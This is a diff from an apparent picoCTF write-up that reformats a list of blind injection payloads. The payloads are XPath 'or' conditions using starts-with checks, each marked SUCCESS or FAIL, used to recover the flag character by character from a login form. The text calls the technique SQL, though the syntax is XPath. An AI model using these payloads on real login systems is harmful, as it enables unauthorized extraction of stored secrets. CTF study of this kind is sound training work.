@@ -32,17 +32,29 @@ we get 'Your on the right path.' Great, this must be a blind SQL and all we get 
 now, see if you follow my train of thoughts and hopefully understand how this works by the end of these conseutivve exploits
 
  name=' or 'x'='y&pass=test (FAIL)
+ 
+ 
  name' or 1=1 or 'x'='y&pass=test (SUCCESS) 
+ 
+ 
  name' or //*[starts-with(text(),'randomWord')] or 'x'='y&pass=test (FAIL)
-  name' or //*[starts-with(text(),'picoCTF{')] or 'x'='y&pass=test (SUCCESS)
-   name' or //*[starts-with(text(),'picoCTF{a')] or 'x'='y&pass=test (FAIL)
+ 
+ 
+ name' or //*[starts-with(text(),'picoCTF{')] or 'x'='y&pass=test (SUCCESS)
+ 
+ 
+ name' or //*[starts-with(text(),'picoCTF{a')] or 'x'='y&pass=test (FAIL)
    .
    .
    .
-    name' or //*[starts-with(text(),'picoCTF{h')] or 'x'='y&pass=test (SUCCESS)
-    name' or //*[starts-with(text(),'picoCTF{ha')] or 'x'='y&pass=test (FAIL)
-    ....
-    name' or //*[starts-with(text(),'picoCTF{h0')] or 'x'='y&pass=test (SUCCESS)
+name' or //*[starts-with(text(),'picoCTF{h')] or 'x'='y&pass=test (SUCCESS)
+
+
+name' or //*[starts-with(text(),'picoCTF{ha')] or 'x'='y&pass=test (FAIL)
+    .
+    . 
+    .
+name' or //*[starts-with(text(),'picoCTF{h0')] or 'x'='y&pass=test (SUCCESS)
     
     
     
